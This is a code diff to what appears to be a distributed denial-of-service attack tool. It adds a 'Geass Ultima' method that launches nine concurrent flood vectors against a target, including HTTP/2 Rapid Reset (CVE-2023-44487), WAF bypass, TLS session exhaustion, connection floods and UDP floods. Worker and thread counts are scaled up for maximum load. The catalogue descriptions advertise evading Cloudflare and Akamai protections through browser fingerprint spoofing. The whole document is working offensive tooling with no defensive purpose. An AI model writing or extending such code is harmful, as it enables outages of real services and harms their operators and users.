@@ -359,6 +359,8 @@ const HTTP_PROXY_METHODS = new Set([
   "h2-dep-bomb", "h2-data-flood",
   // New methods (2026)
   "rapid-reset", "ws-compression-bomb", "h2-goaway-loop", "sse-exhaust",
+  // Final form — all vectors + proxy rotation
+  "geass-ultima",
 ]);
 
 function spawnPool(
@@ -800,6 +802,46 @@ async function runAttackWorkers(
     return;
   }
 
+  // ─────────────────────────────────────────────────────────────────────────
+  //  GEASS ULTIMA — Final Form: 9 simultaneous vectors across every OSI layer
+  //  Each worker independently runs all 9 vectors → CPU_COUNT × 9 vectors total
+  // ─────────────────────────────────────────────────────────────────────────
+  if (method === "geass-ultima") {
+    // Socket-holding vectors → 1 worker; stateless vectors → scale with CPU_COUNT
+    const rrW    = Math.max(4, CPU_COUNT);                       // Rapid Reset Ultra (stateless)
+    const wafW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);  // WAF Bypass
+    const h2W    = Math.max(4, CPU_COUNT);                       // H2 Storm
+    const appW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);  // App Smart Flood
+    const tlsW   = 1;                                            // TLS Session Exhaust (sockets)
+    const connW  = 1;                                            // Conn Flood (persistent sockets)
+    const pipeW  = Math.max(4, CPU_COUNT);                       // HTTP Pipeline
+    const sseW   = 1;                                            // SSE Exhaust (persistent)
+    const udpW   = 1;                                            // UDP (single worker)
+
+    const rrT    = Math.max(800,  Math.round(threads * 0.55)); // ★★★★★ Rapid Reset (highest priority)
+    const wafT   = Math.max(600,  Math.round(threads * 0.45)); // ★★★★ WAF Bypass
+    const h2T    = Math.max(700,  Math.round(threads * 0.50)); // ★★★★ H2 Storm
+    const appT   = Math.max(500,  Math.round(threads * 0.35)); // ★★★ App Smart Flood
+    const tlsT   = Math.max(200,  Math.round(threads * 0.12)); // TLS Session
+    const connT  = Math.max(300,  Math.round(threads * 0.15)); // Conn Flood
+    const pipeT  = Math.max(1200, Math.round(threads * 0.70)); // ★★★★ HTTP Pipeline
+    const sseT   = Math.max(100,  Math.round(threads * 0.08)); // SSE Exhaust
+    const udpT   = Math.max(200,  Math.round(threads * 0.10)); // UDP Flood
+
+    await Promise.all([
+      spawnPool("rapid-reset",        target, port, rrT,   rrW,   signal, onStats),
+      spawnPool("waf-bypass",         target, port, wafT,  wafW,  signal, onStats),
+      spawnPool("h2-storm",           target, port, h2T,   h2W,   signal, onStats),
+      spawnPool("app-smart-flood",    target, port, appT,  appW,  signal, onStats),
+      spawnPool("tls-session-exhaust",target, port, tlsT,  tlsW,  signal, onStats),
+      spawnPool("conn-flood",         target, port, connT, connW, signal, onStats),
+      spawnPool("http-pipeline",      target, port, pipeT, pipeW, signal, onStats),
+      spawnPool("sse-exhaust",        target, port, sseT,  sseW,  signal, onStats),
+      spawnPool("udp-flood",          target, port, udpT,  udpW,  signal, onStats),
+    ]);
+    return;
+  }
+
   // All other real-network methods: single pool of CPU_COUNT workers (1 in dev)
   await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
 }
@@ -808,7 +850,8 @@ async function runAttackWorkers(
 const METHODS_CATALOGUE = [
   // Geass / Special
   { id: "geass-override",       name: "Geass Override ∞ [ARES 42v]",          layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS",    tier: "ARES",   description: "MAX POWER — 42 simultaneous attack vectors: H3-RapidReset(CVE-44487)+QUIC+H2-RST+H2-CONTINUATION(CVE-27316)+H2-Settings+Pipeline+Slowloris+HPACK+WAF+TLS+WS-Deflate+DNS+gRPC+..." },
-  { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST → Phase 3: AppFlood+CacheBust. All 3 phases run concurrently with independent thread pools" },
+  { id: "geass-ultima",         name: "Geass Ultima ∞ [FINAL FORM — 9v]",      layer: "ALL",  protocol: "TCP/UDP/H2/TLS",       tier: "ARES",   description: "FORMA FINAL — 9 vetores simultâneos em todas as camadas OSI: RapidReset(CVE-44487)+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP. Zero delay, máximo impacto" },
+  { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST+RapidReset → Phase 3: AppFlood+CacheBust. Fases independentes + RapidReset no Phase 2" },
   // L7 Application
   { id: "waf-bypass",           name: "Geass WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
   { id: "http2-flood",          name: "HTTP/2 Rapid Reset",                   layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s" },
